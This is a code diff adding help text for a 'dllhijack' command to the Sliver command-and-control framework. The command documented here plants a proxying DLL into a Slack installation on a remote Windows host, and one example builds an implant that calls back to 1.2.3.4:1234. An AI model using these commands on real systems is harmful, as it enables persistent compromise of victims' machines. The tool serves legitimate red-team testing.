@@ -88,6 +88,7 @@ var (
 		consts.WgPortFwdStr:                 wgPortFwdHelp,
 		consts.WgSocksStr:                   wgSocksHelp,
 		consts.SSHStr:                       sshHelp,
+		consts.DLLHijackStr:                 dllHijackHelp,
 
 		// Loot
 		consts.LootStr: lootHelp,
@@ -608,6 +609,24 @@ reaction set
 [[.Bold]]Examples:[[.Normal]]
 # Remove a reaction
 reaction unset --id 1
+`
+	dllHijackHelp = `[[.Bold]]Command:[[.Normal]] dllhijack
+[[.Bold]]About:[[.Normal]] Prepare and plant a DLL on the remote system for a hijack scenario.
+The planted DLL will have its export directory modified to forward the exports to a reference DLL
+on the remote system.
+The DLL used for the hijack can either be a file on the operator's system or built from a Sliver profile,
+supplied with the --profile flag.
+
+[[.Bold]]Examples:[[.Normal]]
+# Use a local DLL for a hijack
+dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --file /tmp/blah.dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll
+
+# Use a Sliver generated DLL for the hijack
+new-profile --format shared --mtls 1.2.3.4:1234 --profile-name dll
+dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --profile dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll
+
+# Use a local DLL as the reference DLL
+dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --reference-file /tmp/msasn1.dll.orig --profile dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll
 `
 )
 
